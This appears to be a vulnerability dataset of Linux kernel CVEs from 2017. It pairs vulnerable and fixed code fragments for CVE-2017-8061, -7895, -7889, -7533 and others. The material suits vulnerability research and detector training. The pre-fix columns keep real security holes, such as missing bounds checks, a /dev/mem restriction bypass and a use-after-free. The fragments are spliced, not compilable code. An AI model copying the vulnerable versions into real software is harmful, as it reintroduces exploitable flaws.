 state->data[1] = 0x83;
 state->data[2] = 1;

 if (dvb_usb_generic_rw(d, state->data, 3, state->data, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 state->data[0] = 0x51;

 if (dvb_usb_generic_rw(d, state->data, 1, state->data, 1, 0) < 0)
 err(""command 0x51 transfer failed."");

 mutex_unlock(&d->data_mutex);

	adap->fe_adap[0].fe = dvb_attach(ds3000_attach, &su3000_ds3000_config,
					&d->i2c_adap);
 if (adap->fe_adap[0].fe == NULL)
 return -EIO;

 if (dvb_attach(ts2020_attach, adap->fe_adap[0].fe,
				&dw2104_ts2020_config,
				&d->i2c_adap)) {
 info(""Attached DS3000/TS2020!"");
 return 0;
	}
 return -EIO;
}

static int t220_frontend_attach(struct dvb_usb_adapter *adap)
{
 struct dvb_usb_device *d = adap->dev;
 struct dw2102_state *state = d->priv;

 mutex_lock(&d->data_mutex);

	state->data[0] = 0xe;
	state->data[1] = 0x87;
	state->data[2] = 0x0;

 if (dvb_usb_generic_rw(d, state->data, 3, state->data, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 state->data[0] = 0xe;
 state->data[1] = 0x86;
 state->data[2] = 1;

 if (dvb_usb_generic_rw(d, state->data, 3, state->data, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 state->data[0] = 0xe;
 state->data[1] = 0x80;
 state->data[2] = 0;

 if (dvb_usb_generic_rw(d, state->data, 3, state->data, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 msleep(50);

 state->data[0] = 0xe;
 state->data[1] = 0x80;
 state->data[2] = 1;

 if (dvb_usb_generic_rw(d, state->data, 3, state->data, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 state->data[0] = 0x51;

 if (dvb_usb_generic_rw(d, state->data, 1, state->data, 1, 0) < 0)
 err(""command 0x51 transfer failed."");

 mutex_unlock(&d->data_mutex);

	adap->fe_adap[0].fe = dvb_attach(cxd2820r_attach, &cxd2820r_config,
					&d->i2c_adap, NULL);
 if (adap->fe_adap[0].fe != NULL) {
 if (dvb_attach(tda18271_attach, adap->fe_adap[0].fe, 0x60,
					&d->i2c_adap, &tda18271_config)) {
 info(""Attached TDA18271HD/CXD2820R!"");
 return 0;
		}
 return -EIO;
}

static int m88rs2000_frontend_attach(struct dvb_usb_adapter *adap)
{
 struct dvb_usb_device *d = adap->dev;
 struct dw2102_state *state = d->priv;

 mutex_lock(&d->data_mutex);

	state->data[0] = 0x51;

 if (dvb_usb_generic_rw(d, state->data, 1, state->data, 1, 0) < 0)
 err(""command 0x51 transfer failed."");

 mutex_unlock(&d->data_mutex);


	adap->fe_adap[0].fe = dvb_attach(m88rs2000_attach,
					&s421_m88rs2000_config,
					&d->i2c_adap);

 if (adap->fe_adap[0].fe == NULL)
 return -EIO;

 if (dvb_attach(ts2020_attach, adap->fe_adap[0].fe,
				&dw2104_ts2020_config,
				&d->i2c_adap)) {
 info(""Attached RS2000/TS2020!"");
 return 0;
	}
{
 struct dvb_usb_device *d = adap->dev;
 struct dw2102_state *state = d->priv;


 struct i2c_adapter *i2c_adapter;
 struct i2c_client *client;
 struct i2c_board_info board_info;
 struct m88ds3103_platform_data m88ds3103_pdata = {};
 struct ts2020_config ts2020_config = {};

 mutex_lock(&d->data_mutex);

	state->data[0] = 0xe;
	state->data[1] = 0x80;
	state->data[2] = 0x0;

 if (dvb_usb_generic_rw(d, state->data, 3, state->data, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 state->data[0] = 0xe;
 state->data[1] = 0x02;
 state->data[2] = 1;

 if (dvb_usb_generic_rw(d, state->data, 3, state->data, 1, 0) < 0)
 err(""command 0x0e transfer failed."");
 msleep(300);

 state->data[0] = 0xe;
 state->data[1] = 0x83;
 state->data[2] = 0;

 if (dvb_usb_generic_rw(d, state->data, 3, state->data, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 state->data[0] = 0xe;
 state->data[1] = 0x83;
 state->data[2] = 1;

 if (dvb_usb_generic_rw(d, state->data, 3, state->data, 1, 0) < 0)
 err(""command 0x0e transfer failed."");

 state->data[0] = 0x51;

 if (dvb_usb_generic_rw(d, state->data, 1, state->data, 1, 0) < 0)
 err(""command 0x51 transfer failed."");

 mutex_unlock(&d->data_mutex);

 /* attach demod */
	m88ds3103_pdata.clk = 27000000;
	m88ds3103_pdata.i2c_wr_max = 33;
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-8061,"int usb_cypress_load_firmware(struct usb_device *udev, const struct firmware *fw, int type)
{
 struct hexline *hx;
	u8 reset;
 int ret,pos=0;


 hx = kmalloc(sizeof(*hx), GFP_KERNEL);
 if (!hx)
 return -ENOMEM;


 /* stop the CPU */
 reset = 1;
 if ((ret = usb_cypress_writemem(udev,cypress[type].cpu_cs_register,&reset,1)) != 1)
 err(""could not stop the USB controller CPU."");

 while ((ret = dvb_usb_get_hexline(fw, hx, &pos)) > 0) {
	}
 if (ret < 0) {
 err(""firmware download failed at %d with %d"",pos,ret);
 kfree(hx);
 return ret;
	}

 if (ret == 0) {
 /* restart the CPU */
 reset = 0;
 if (ret || usb_cypress_writemem(udev,cypress[type].cpu_cs_register,&reset,1) != 1) {
 err(""could not restart the USB controller CPU."");
			ret = -EINVAL;
		}
	} else
		ret = -EIO;

 kfree(hx);

 return ret;
}
","int usb_cypress_load_firmware(struct usb_device *udev, const struct firmware *fw, int type)
{
 struct hexline *hx;
	u8 *buf;
 int ret, pos = 0;
	u16 cpu_cs_register = cypress[type].cpu_cs_register;

 buf = kmalloc(sizeof(*hx), GFP_KERNEL);
 if (!buf)
 return -ENOMEM;
	hx = (struct hexline *)buf;

 /* stop the CPU */
 buf[0] = 1;
 if (usb_cypress_writemem(udev, cpu_cs_register, buf, 1) != 1)
 err(""could not stop the USB controller CPU."");

 while ((ret = dvb_usb_get_hexline(fw, hx, &pos)) > 0) {
	}
 if (ret < 0) {
 err(""firmware download failed at %d with %d"",pos,ret);
 kfree(buf);
 return ret;
	}

 if (ret == 0) {
 /* restart the CPU */
 buf[0] = 0;
 if (usb_cypress_writemem(udev, cpu_cs_register, buf, 1) != 1) {
 err(""could not restart the USB controller CPU."");
			ret = -EINVAL;
		}
	} else
		ret = -EIO;

 kfree(buf);

 return ret;
}
"
2017,DoS ,CVE-2017-7979,,
2017,Overflow ,CVE-2017-7895,"	args->count = ntohl(*p++);
	args->stable = ntohl(*p++);
	len = args->len = ntohl(*p++);


 /*
	 * The count must equal the amount of data passed.
 */
 /* first copy and check from the first page */
	old = (char*)p;
	vec = &rqstp->rq_arg.head[0];


	avail = vec->iov_len - (old - (char*)vec->iov_base);
 while (len && avail && *old) {
		*new++ = *old++;
	 * bytes.
 */
	hdr = (void*)p - head->iov_base;


	dlen = head->iov_len + rqstp->rq_arg.page_len - hdr;

 /*
","	args->count = ntohl(*p++);
	args->stable = ntohl(*p++);
	len = args->len = ntohl(*p++);
 if ((void *)p > head->iov_base + head->iov_len)
 return 0;
 /*
	 * The count must equal the amount of data passed.
 */
 /* first copy and check from the first page */
	old = (char*)p;
	vec = &rqstp->rq_arg.head[0];
 if ((void *)old > vec->iov_base + vec->iov_len)
 return 0;
	avail = vec->iov_len - (old - (char*)vec->iov_base);
 while (len && avail && *old) {
		*new++ = *old++;
	 * bytes.
 */
	hdr = (void*)p - head->iov_base;
 if (hdr > head->iov_len)
 return 0;
	dlen = head->iov_len + rqstp->rq_arg.page_len - hdr;

 /*
"
2017,Bypass ,CVE-2017-7889," * devmem_is_allowed() checks to see if /dev/mem access to a certain address
 * is valid. The argument is a physical page number.
 *
 *
 * On x86, access has to be given to the first megabyte of ram because that area
 * contains BIOS code and data regions used by X and dosemu and similar apps.
 * Access has to be given to non-kernel-ram areas as well, these contain the PCI
 * mmio resources as well as potential bios/acpi data regions.


 */
int devmem_is_allowed(unsigned long pagenr)
{
 if (pagenr < 256)
 return 1;
 if (iomem_is_exclusive(pagenr << PAGE_SHIFT))

















 return 0;
 if (!page_is_ram(pagenr))
 return 1;
 return 0;
}

void free_init_pages(char *what, unsigned long begin, unsigned long end)
#endif

#ifdef CONFIG_STRICT_DEVMEM




static inline int range_is_allowed(unsigned long pfn, unsigned long size)
{
	u64 from = ((u64)pfn) << PAGE_SHIFT;
 return 1;
}
#else




static inline int range_is_allowed(unsigned long pfn, unsigned long size)
{
 return 1;

 while (count > 0) {
 unsigned long remaining;


		sz = size_inside_page(p, count);

 if (!range_is_allowed(p >> PAGE_SHIFT, count))

 return -EPERM;













 /*
		 * On ia64 if a page has been mapped somewhere as uncached, then
		 * it must also be accessed uncached by the kernel or data
		 * corruption may occur.
 */
		ptr = xlate_dev_mem_ptr(p);
 if (!ptr)
 return -EFAULT;

		remaining = copy_to_user(buf, ptr, sz);
 unxlate_dev_mem_ptr(p, ptr);
 if (remaining)
 return -EFAULT;

#endif

 while (count > 0) {


		sz = size_inside_page(p, count);

 if (!range_is_allowed(p >> PAGE_SHIFT, sz))

 return -EPERM;

 /*
		 * On ia64 if a page has been mapped somewhere as uncached, then
		 * it must also be accessed uncached by the kernel or data
		 * corruption may occur.
 */
		ptr = xlate_dev_mem_ptr(p);
 if (!ptr) {
 if (written)
 break;
 return -EFAULT;
		}



		copied = copy_from_user(ptr, buf, sz);
 unxlate_dev_mem_ptr(p, ptr);
 if (copied) {
			written += sz - copied;
 if (written)
 break;
 return -EFAULT;

		}

		buf += sz;
"," * devmem_is_allowed() checks to see if /dev/mem access to a certain address
 * is valid. The argument is a physical page number.
 *
 * On x86, access has to be given to the first megabyte of RAM because that
 * area traditionally contains BIOS code and data regions used by X, dosemu,
 * and similar apps. Since they map the entire memory range, the whole range
 * must be allowed (for mapping), but any areas that would otherwise be
 * disallowed are flagged as being ""zero filled"" instead of rejected.
 * Access has to be given to non-kernel-ram areas as well, these contain the
 * PCI mmio resources as well as potential bios/acpi data regions.
 */
int devmem_is_allowed(unsigned long pagenr)
{
 if (page_is_ram(pagenr)) {
 /*
		 * For disallowed memory regions in the low 1MB range,
		 * request that the page be shown as all zeros.
 */
 if (pagenr < 256)
 return 2;

 return 0;
	}

 /*
	 * This must follow RAM test, since System RAM is considered a
	 * restricted resource under CONFIG_STRICT_IOMEM.
 */
 if (iomem_is_exclusive(pagenr << PAGE_SHIFT)) {
 /* Low 1MB bypasses iomem restrictions. */
 if (pagenr < 256)
 return 1;

 return 0;
 }

 return 1;
}

void free_init_pages(char *what, unsigned long begin, unsigned long end)
#endif

#ifdef CONFIG_STRICT_DEVMEM
static inline int page_is_allowed(unsigned long pfn)
{
 return devmem_is_allowed(pfn);
}
static inline int range_is_allowed(unsigned long pfn, unsigned long size)
{
	u64 from = ((u64)pfn) << PAGE_SHIFT;
 return 1;
}
#else
static inline int page_is_allowed(unsigned long pfn)
{
 return 1;
}
static inline int range_is_allowed(unsigned long pfn, unsigned long size)
{
 return 1;

 while (count > 0) {
 unsigned long remaining;
 int allowed;

		sz = size_inside_page(p, count);

		allowed = page_is_allowed(p >> PAGE_SHIFT);
 if (!allowed)
 return -EPERM;
 if (allowed == 2) {
 /* Show zeros for restricted memory. */
			remaining = clear_user(buf, sz);
		} else {
 /*
			 * On ia64 if a page has been mapped somewhere as
			 * uncached, then it must also be accessed uncached
			 * by the kernel or data corruption may occur.
 */
			ptr = xlate_dev_mem_ptr(p);
 if (!ptr)
 return -EFAULT;

			remaining = copy_to_user(buf, ptr, sz);

 unxlate_dev_mem_ptr(p, ptr);
		}







 if (remaining)
 return -EFAULT;

#endif

 while (count > 0) {
 int allowed;

		sz = size_inside_page(p, count);

		allowed = page_is_allowed(p >> PAGE_SHIFT);
 if (!allowed)
 return -EPERM;

 /* Skip actual writing when a page is marked as restricted. */
 if (allowed == 1) {
 /*
			 * On ia64 if a page has been mapped somewhere as
			 * uncached, then it must also be accessed uncached
			 * by the kernel or data corruption may occur.
 */
			ptr = xlate_dev_mem_ptr(p);
 if (!ptr) {
 if (written)
 break;
 return -EFAULT;
			}

			copied = copy_from_user(ptr, buf, sz);
 unxlate_dev_mem_ptr(p, ptr);
 if (copied) {
				written += sz - copied;
 if (written)
 break;
 return -EFAULT;
			}
		}

		buf += sz;
"
2017,DoS ,CVE-2017-7645," return nfserr;
}
































int
nfsd_dispatch(struct svc_rqst *rqstp, __be32 *statp)
{
				rqstp->rq_vers, rqstp->rq_proc);
	proc = rqstp->rq_procinfo;






 /*
	 * Give the xdr decoder a chance to change this if it wants
	 * (necessary in the NFSv4.0 compound case)
"," return nfserr;
}

/*
 * A write procedure can have a large argument, and a read procedure can
 * have a large reply, but no NFSv2 or NFSv3 procedure has argument and
 * reply that can both be larger than a page.  The xdr code has taken
 * advantage of this assumption to be a sloppy about bounds checking in
 * some cases.  Pending a rewrite of the NFSv2/v3 xdr code to fix that
 * problem, we enforce these assumptions here:
 */
static bool nfs_request_too_big(struct svc_rqst *rqstp,
 struct svc_procedure *proc)
{
 /*
	 * The ACL code has more careful bounds-checking and is not
	 * susceptible to this problem:
 */
 if (rqstp->rq_prog != NFS_PROGRAM)
 return false;
 /*
	 * Ditto NFSv4 (which can in theory have argument and reply both
	 * more than a page):
 */
 if (rqstp->rq_vers >= 4)
 return false;
 /* The reply will be small, we're OK: */
 if (proc->pc_xdrressize > 0 &&
	    proc->pc_xdrressize < XDR_QUADLEN(PAGE_SIZE))
 return false;

 return rqstp->rq_arg.len > PAGE_SIZE;
}

int
nfsd_dispatch(struct svc_rqst *rqstp, __be32 *statp)
{
				rqstp->rq_vers, rqstp->rq_proc);
	proc = rqstp->rq_procinfo;

 if (nfs_request_too_big(rqstp, proc)) {
 dprintk(""nfsd: NFSv%d argument too large\n"", rqstp->rq_vers);
		*statp = rpc_garbage_args;
 return 1;
	}
 /*
	 * Give the xdr decoder a chance to change this if it wants
	 * (necessary in the NFSv4.0 compound case)
"
2017,DoS ,CVE-2017-7618,,
2017,#NAME?,CVE-2017-7616,"COMPAT_SYSCALL_DEFINE3(set_mempolicy, int, mode, compat_ulong_t __user *, nmask,
 compat_ulong_t, maxnode)
{
 long err = 0;
 unsigned long __user *nm = NULL;
 unsigned long nr_bits, alloc_size;
 DECLARE_BITMAP(bm, MAX_NUMNODES);
	alloc_size = ALIGN(nr_bits, BITS_PER_LONG) / 8;

 if (nmask) {
		err = compat_get_bitmap(bm, nmask, nr_bits);

		nm = compat_alloc_user_space(alloc_size);
		err |= copy_to_user(nm, bm, alloc_size);

	}

 if (err)
 return -EFAULT;

 return sys_set_mempolicy(mode, nm, nr_bits+1);
}

COMPAT_SYSCALL_DEFINE6(mbind, compat_ulong_t, start, compat_ulong_t, len,
 compat_ulong_t, mode, compat_ulong_t __user *, nmask,
 compat_ulong_t, maxnode, compat_ulong_t, flags)
{
 long err = 0;
 unsigned long __user *nm = NULL;
 unsigned long nr_bits, alloc_size;
 nodemask_t bm;
	alloc_size = ALIGN(nr_bits, BITS_PER_LONG) / 8;

 if (nmask) {
		err = compat_get_bitmap(nodes_addr(bm), nmask, nr_bits);

		nm = compat_alloc_user_space(alloc_size);
		err |= copy_to_user(nm, nodes_addr(bm), alloc_size);

	}

 if (err)
 return -EFAULT;

 return sys_mbind(start, len, mode, nm, nr_bits+1, flags);
}

","COMPAT_SYSCALL_DEFINE3(set_mempolicy, int, mode, compat_ulong_t __user *, nmask,
 compat_ulong_t, maxnode)
{

 unsigned long __user *nm = NULL;
 unsigned long nr_bits, alloc_size;
 DECLARE_BITMAP(bm, MAX_NUMNODES);
	alloc_size = ALIGN(nr_bits, BITS_PER_LONG) / 8;

 if (nmask) {
 if (compat_get_bitmap(bm, nmask, nr_bits))
 return -EFAULT;
		nm = compat_alloc_user_space(alloc_size);
 if (copy_to_user(nm, bm, alloc_size))
 return -EFAULT;
	}




 return sys_set_mempolicy(mode, nm, nr_bits+1);
}

COMPAT_SYSCALL_DEFINE6(mbind, compat_ulong_t, start, compat_ulong_t, len,
 compat_ulong_t, mode, compat_ulong_t __user *, nmask,
 compat_ulong_t, maxnode, compat_ulong_t, flags)
{

 unsigned long __user *nm = NULL;
 unsigned long nr_bits, alloc_size;
 nodemask_t bm;
	alloc_size = ALIGN(nr_bits, BITS_PER_LONG) / 8;

 if (nmask) {
 if (compat_get_bitmap(nodes_addr(bm), nmask, nr_bits))
 return -EFAULT;
		nm = compat_alloc_user_space(alloc_size);
 if (copy_to_user(nm, nodes_addr(bm), alloc_size))
 return -EFAULT;
	}




 return sys_mbind(start, len, mode, nm, nr_bits+1, flags);
}

"
2018,#NAME?,CVE-2017-7558,,
2017,DoS Overflow ,CVE-2017-7542,"
int ip6_find_1stfragopt(struct sk_buff *skb, u8 **nexthdr)
{
 u16 offset = sizeof(struct ipv6hdr);
 unsigned int packet_len = skb_tail_pointer(skb) -
 skb_network_header(skb);
 int found_rhdr = 0;
	*nexthdr = &ipv6_hdr(skb)->nexthdr;

 while (offset <= packet_len) {
 struct ipv6_opt_hdr *exthdr;


 switch (**nexthdr) {


		exthdr = (struct ipv6_opt_hdr *)(skb_network_header(skb) +
						 offset);
		offset += ipv6_optlen(exthdr);



		*nexthdr = &exthdr->nexthdr;
	}

","
int ip6_find_1stfragopt(struct sk_buff *skb, u8 **nexthdr)
{
 unsigned int offset = sizeof(struct ipv6hdr);
 unsigned int packet_len = skb_tail_pointer(skb) -
 skb_network_header(skb);
 int found_rhdr = 0;
	*nexthdr = &ipv6_hdr(skb)->nexthdr;

 while (offset <= packet_len) {
 struct ipv6_opt_hdr *exthdr;
 unsigned int len;

 switch (**nexthdr) {


		exthdr = (struct ipv6_opt_hdr *)(skb_network_header(skb) +
						 offset);
		len = ipv6_optlen(exthdr);
 if (len + offset >= IPV6_MAXPLEN)
 return -EINVAL;
		offset += len;
		*nexthdr = &exthdr->nexthdr;
	}

"
2017,DoS Overflow +Priv ,CVE-2017-7541," cfg80211_mgmt_tx_status(wdev, *cookie, buf, len, true,
					GFP_KERNEL);
	} else if (ieee80211_is_action(mgmt->frame_control)) {





		af_params = kzalloc(sizeof(*af_params), GFP_KERNEL);
 if (af_params == NULL) {
 brcmf_err(""unable to allocate frame\n"");
"," cfg80211_mgmt_tx_status(wdev, *cookie, buf, len, true,
					GFP_KERNEL);
	} else if (ieee80211_is_action(mgmt->frame_control)) {
 if (len > BRCMF_FIL_ACTION_FRAME_SIZE + DOT11_MGMT_HDR_LEN) {
 brcmf_err(""invalid action frame length\n"");
			err = -EINVAL;
 goto exit;
		}
		af_params = kzalloc(sizeof(*af_params), GFP_KERNEL);
 if (af_params == NULL) {
 brcmf_err(""unable to allocate frame\n"");
"
2017,DoS +Priv Mem. Corr. ,CVE-2017-7533," return dentry->d_name.name != dentry->d_iname;
}




























static inline void __d_set_inode_and_type(struct dentry *dentry,
 struct inode *inode,
 unsigned type_flags)
{
 int error;
 struct dentry *dentry = NULL, *trap;
 const char *old_name;

	trap = lock_rename(new_dir, old_dir);
 /* Source or destination directories don't exist? */
 if (IS_ERR(dentry) || dentry == trap || d_really_is_positive(dentry))
 goto exit;

	old_name = fsnotify_oldname_init(old_dentry->d_name.name);

	error = simple_rename(d_inode(old_dir), old_dentry, d_inode(new_dir),
			      dentry, 0);
 if (error) {
 fsnotify_oldname_free(old_name);
 goto exit;
	}
 d_move(old_dentry, dentry);
 fsnotify_move(d_inode(old_dir), d_inode(new_dir), old_name,
 d_is_dir(old_dentry),
 NULL, old_dentry);
 fsnotify_oldname_free(old_name);
 unlock_rename(new_dir, old_dir);
 dput(dentry);
 return old_dentry;
{
 int error;
 bool is_dir = d_is_dir(old_dentry);
 const unsigned char *old_name;
 struct inode *source = old_dentry->d_inode;
 struct inode *target = new_dentry->d_inode;
 bool new_is_dir = false;
 unsigned max_links = new_dir->i_sb->s_max_links;


 if (source == target)
 return 0;
 if (error)
 return error;

	old_name = fsnotify_oldname_init(old_dentry->d_name.name);
 dget(new_dentry);
 if (!is_dir || (flags & RENAME_EXCHANGE))
 lock_two_nondirectories(source, target);
 inode_unlock(target);
 dput(new_dentry);
 if (!error) {
 fsnotify_move(old_dir, new_dir, old_name, is_dir,
			      !(flags & RENAME_EXCHANGE) ? target : NULL, old_dentry);
 if (flags & RENAME_EXCHANGE) {
 fsnotify_move(new_dir, old_dir, old_dentry->d_name.name,
				      new_is_dir, NULL, new_dentry);
		}
	}
 fsnotify_oldname_free(old_name);

 return error;
}
 if (unlikely(!fsnotify_inode_watches_children(p_inode)))
 __fsnotify_update_child_dentry_flags(p_inode);
 else if (p_inode->i_fsnotify_mask & mask) {


 /* we are notifying a parent so come up with the new mask which
		 * specifies these are events which came from a child. */
		mask |= FS_EVENT_ON_CHILD;


 if (path)
			ret = fsnotify(p_inode, mask, path, FSNOTIFY_EVENT_PATH,
 dentry->d_name.name, 0);
 else
			ret = fsnotify(p_inode, mask, dentry->d_inode, FSNOTIFY_EVENT_INODE,
				       dentry->d_name.name, 0);

	}

 dput(parent);
 return d_backing_inode(d_real((struct dentry *) dentry, NULL, 0));
}








#endif /* __LINUX_DCACHE_H */
	}
}

#if defined(CONFIG_FSNOTIFY)	/* notify helpers */

/*
 * fsnotify_oldname_init - save off the old filename before we change it
 */
static inline const unsigned char *fsnotify_oldname_init(const unsigned char *name)
{
 return kstrdup(name, GFP_KERNEL);
}

/*
 * fsnotify_oldname_free - free the name we got from fsnotify_oldname_init
 */
static inline void fsnotify_oldname_free(const unsigned char *old_name)
{
 kfree(old_name);
}

#else /* CONFIG_FSNOTIFY */

static inline const char *fsnotify_oldname_init(const unsigned char *name)
{
 return NULL;
}

static inline void fsnotify_oldname_free(const unsigned char *old_name)
{
}

#endif /*  CONFIG_FSNOTIFY */

#endif /* _LINUX_FS_NOTIFY_H */
"," return dentry->d_name.name != dentry->d_iname;
}

void take_dentry_name_snapshot(struct name_snapshot *name, struct dentry *dentry)
{
 spin_lock(&dentry->d_lock);
 if (unlikely(dname_external(dentry))) {
 struct external_name *p = external_name(dentry);
 atomic_inc(&p->u.count);
 spin_unlock(&dentry->d_lock);
		name->name = p->name;
	} else {
 memcpy(name->inline_name, dentry->d_iname, DNAME_INLINE_LEN);
 spin_unlock(&dentry->d_lock);
		name->name = name->inline_name;
	}
}
EXPORT_SYMBOL(take_dentry_name_snapshot);

void release_dentry_name_snapshot(struct name_snapshot *name)
{
 if (unlikely(name->name != name->inline_name)) {
 struct external_name *p;
		p = container_of(name->name, struct external_name, name[0]);
 if (unlikely(atomic_dec_and_test(&p->u.count)))
 kfree_rcu(p, u.head);
	}
}
EXPORT_SYMBOL(release_dentry_name_snapshot);

static inline void __d_set_inode_and_type(struct dentry *dentry,
 struct inode *inode,
 unsigned type_flags)
{
 int error;
 struct dentry *dentry = NULL, *trap;
 struct name_snapshot old_name;

	trap = lock_rename(new_dir, old_dir);
 /* Source or destination directories don't exist? */
 if (IS_ERR(dentry) || dentry == trap || d_really_is_positive(dentry))
 goto exit;

 take_dentry_name_snapshot(&old_name, old_dentry);

	error = simple_rename(d_inode(old_dir), old_dentry, d_inode(new_dir),
			      dentry, 0);
 if (error) {
 release_dentry_name_snapshot(&old_name);
 goto exit;
	}
 d_move(old_dentry, dentry);
 fsnotify_move(d_inode(old_dir), d_inode(new_dir), old_name.name,
 d_is_dir(old_dentry),
 NULL, old_dentry);
 release_dentry_name_snapshot(&old_name);
 unlock_rename(new_dir, old_dir);
 dput(dentry);
 return old_dentry;
{
 int error;
 bool is_dir = d_is_dir(old_dentry);

 struct inode *source = old_dentry->d_inode;
 struct inode *target = new_dentry->d_inode;
 bool new_is_dir = false;
 unsigned max_links = new_dir->i_sb->s_max_links;
 struct name_snapshot old_name;

 if (source == target)
 return 0;
 if (error)
 return error;

 take_dentry_name_snapshot(&old_name, old_dentry);
 dget(new_dentry);
 if (!is_dir || (flags & RENAME_EXCHANGE))
 lock_two_nondirectories(source, target);
 inode_unlock(target);
 dput(new_dentry);
 if (!error) {
 fsnotify_move(old_dir, new_dir, old_name.name, is_dir,
			      !(flags & RENAME_EXCHANGE) ? target : NULL, old_dentry);
 if (flags & RENAME_EXCHANGE) {
 fsnotify_move(new_dir, old_dir, old_dentry->d_name.name,
				      new_is_dir, NULL, new_dentry);
		}
	}
 release_dentry_name_snapshot(&old_name);

 return error;
}
 if (unlikely(!fsnotify_inode_watches_children(p_inode)))
 __fsnotify_update_child_dentry_flags(p_inode);
 else if (p_inode->i_fsnotify_mask & mask) {
 struct name_snapshot name;

 /* we are notifying a parent so come up with the new mask which
		 * specifies these are events which came from a child. */
		mask |= FS_EVENT_ON_CHILD;

 take_dentry_name_snapshot(&name, dentry);
 if (path)
			ret = fsnotify(p_inode, mask, path, FSNOTIFY_EVENT_PATH,
 name.name, 0);
 else
			ret = fsnotify(p_inode, mask, dentry->d_inode, FSNOTIFY_EVENT_INODE,
				       name.name, 0);
 release_dentry_name_snapshot(&name);
	}

 dput(parent);
 return d_backing_inode(d_real((struct dentry *) dentry, NULL, 0));
}

struct name_snapshot {
 const char *name;
 char inline_name[DNAME_INLINE_LEN];
};
void take_dentry_name_snapshot(struct name_snapshot *, struct dentry *);
void release_dentry_name_snapshot(struct name_snapshot *);

#endif /* __LINUX_DCACHE_H */
	}
}
































#endif /* _LINUX_FS_NOTIFY_H */
"
2018,,CVE-2017-7518,,
2017,#NAME?,CVE-2017-7495,"		ret = check_block_validity(inode, map);
 if (ret != 0)
 return ret;















	}
 return retval;
}
 int i_size_changed = 0;

 trace_ext4_write_end(inode, pos, len, copied);
 if (ext4_test_inode_state(inode, EXT4_STATE_ORDERED_MODE)) {
		ret = ext4_jbd2_file_inode(handle, inode);
 if (ret) {
 unlock_page(page);
 put_page(page);
 goto errout;
		}
	}

 if (ext4_has_inline_data(inode)) {
		ret = ext4_write_inline_data_end(inode, pos, len,
						 copied, page);
","		ret = check_block_validity(inode, map);
 if (ret != 0)
 return ret;

 /*
		 * Inodes with freshly allocated blocks where contents will be
		 * visible after transaction commit must be on transaction's
		 * ordered data list.
 */
 if (map->m_flags & EXT4_MAP_NEW &&
		    !(map->m_flags & EXT4_MAP_UNWRITTEN) &&
		    !(flags & EXT4_GET_BLOCKS_ZERO) &&
		    !IS_NOQUOTA(inode) &&
 ext4_should_order_data(inode)) {
			ret = ext4_jbd2_file_inode(handle, inode);
 if (ret)
 return ret;
		}
	}
 return retval;
}
 int i_size_changed = 0;

 trace_ext4_write_end(inode, pos, len, copied);









 if (ext4_has_inline_data(inode)) {
		ret = ext4_write_inline_data_end(inode, pos, len,
						 copied, page);
"
2017,DoS ,CVE-2017-7487,"		sipx->sipx_network	= ipxif->if_netnum;
 memcpy(sipx->sipx_node, ipxif->if_node,
 sizeof(sipx->sipx_node));
		rc = -EFAULT;
 if (copy_to_user(arg, &ifr, sizeof(ifr)))
 break;
 ipxitf_put(ipxif);
		rc = 0;
 break;
	}
 case SIOCAIPXITFCRT:
","		sipx->sipx_network	= ipxif->if_netnum;
 memcpy(sipx->sipx_node, ipxif->if_node,
 sizeof(sipx->sipx_node));
		rc = 0;
 if (copy_to_user(arg, &ifr, sizeof(ifr)))
 rc = -EFAULT;
 ipxitf_put(ipxif);

 break;
	}
 case SIOCAIPXITFCRT:
"
2018,Mem. Corr. ,CVE-2017-7482,,
2017,DoS Overflow ,CVE-2017-7477,,
2017,DoS ,CVE-2017-7472," * Read or set the default keyring in which request_key() will cache keys and
 * return the old setting.
 *
 * If a process keyring is specified then this will be created if it doesn't
 * yet exist.  The old setting will be returned if successful.
 */
long keyctl_set_reqkey_keyring(int reqkey_defl)
{

 case KEY_REQKEY_DEFL_PROCESS_KEYRING:
		ret = install_process_keyring_to_cred(new);
 if (ret < 0) {
 if (ret != -EEXIST)
 goto error;
			ret = 0;
		}
 goto set;

 case KEY_REQKEY_DEFL_DEFAULT:
}

/*
 * Install a fresh thread keyring directly to new credentials.  This keyring is
 * allowed to overrun the quota.


 */
int install_thread_keyring_to_cred(struct cred *new)
{
 struct key *keyring;




	keyring = keyring_alloc(""_tid"", new->uid, new->gid, new,
				KEY_POS_ALL | KEY_USR_VIEW,
				KEY_ALLOC_QUOTA_OVERRUN,
}

/*
 * Install a fresh thread keyring, discarding the old one.


 */
static int install_thread_keyring(void)
{
 if (!new)
 return -ENOMEM;

 BUG_ON(new->thread_keyring);

	ret = install_thread_keyring_to_cred(new);
 if (ret < 0) {
 abort_creds(new);
}

/*
 * Install a process keyring directly to a credentials struct.

 *
 * Returns -EEXIST if there was already a process keyring, 0 if one installed,
 * and other value on any other error
 */
int install_process_keyring_to_cred(struct cred *new)
{
 struct key *keyring;

 if (new->process_keyring)
 return -EEXIST;

	keyring = keyring_alloc(""_pid"", new->uid, new->gid, new,
				KEY_POS_ALL | KEY_USR_VIEW,
}

/*
 * Make sure a process keyring is installed for the current process.  The
 * existing process keyring is not replaced.
 *
 * Returns 0 if there is a process keyring by the end of this function, some
 * error otherwise.
 */
static int install_process_keyring(void)
{
	ret = install_process_keyring_to_cred(new);
 if (ret < 0) {
 abort_creds(new);
 return ret != -EEXIST ? ret : 0;
	}

 return commit_creds(new);
}

/*
 * Install a session keyring directly to a credentials struct.




 */
int install_session_keyring_to_cred(struct cred *cred, struct key *keyring)
{
}

/*
 * Install a session keyring, discarding the old one.  If a keyring is not
 * supplied, an empty one is invented.



 */
static int install_session_keyring(struct key *keyring)
{
"," * Read or set the default keyring in which request_key() will cache keys and
 * return the old setting.
 *
 * If a thread or process keyring is specified then it will be created if it
 * doesn't yet exist.  The old setting will be returned if successful.
 */
long keyctl_set_reqkey_keyring(int reqkey_defl)
{

 case KEY_REQKEY_DEFL_PROCESS_KEYRING:
		ret = install_process_keyring_to_cred(new);
 if (ret < 0)
 goto error;



 goto set;

 case KEY_REQKEY_DEFL_DEFAULT:
}

/*
 * Install a thread keyring to the given credentials struct if it didn't have
 * one already.  This is allowed to overrun the quota.
 *
